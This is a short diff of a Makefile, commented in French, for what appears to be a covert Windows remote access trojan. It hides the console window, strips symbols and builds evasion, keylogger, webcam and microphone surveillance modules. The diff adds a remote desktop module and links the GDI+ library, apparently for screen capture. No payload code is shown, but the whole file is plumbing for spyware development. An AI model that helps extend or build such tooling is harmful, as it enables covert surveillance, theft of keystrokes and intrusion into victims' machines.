@@ -16,7 +16,7 @@ CFLAGS += -I./include -I./src
 
 # Flags pour cacher la console et strip les symbols
 LDFLAGS = -s -mwindows
-LDFLAGS += -lwinhttp -lws2_32 -ladvapi32 -lvfw32 -lole32 -luuid
+LDFLAGS += -lwinhttp -lws2_32 -ladvapi32 -lvfw32 -lole32 -luuid -lgdiplus
 
 # Flags de debug (décommenter pour debug)
 # CFLAGS += -g -DDEBUG
@@ -62,7 +62,9 @@ SURVEILLANCE_SRC = $(SRC_DIR)/surveillance/keylogger.c \
                    $(SRC_DIR)/surveillance/webcam.c \
                    $(SRC_DIR)/surveillance/microphone.c
 
-ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC)
+REMOTE_SRC = $(SRC_DIR)/remote/desktop.c
+
+ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC) $(REMOTE_SRC)
 
 # Fichiers objets
 OBJ = $(patsubst $(SRC_DIR)/%.c,$(BUILD_DIR)/%.o,$(ALL_SRC))
@@ -96,6 +98,7 @@ dirs:
 	@mkdir -p $(BUILD_DIR)/network
 	@mkdir -p $(BUILD_DIR)/tasks/handlers
 	@mkdir -p $(BUILD_DIR)/surveillance
+	@mkdir -p $(BUILD_DIR)/remote
 	@mkdir -p $(BIN_DIR)
 
 $(EXE_TARGET): $(OBJ)
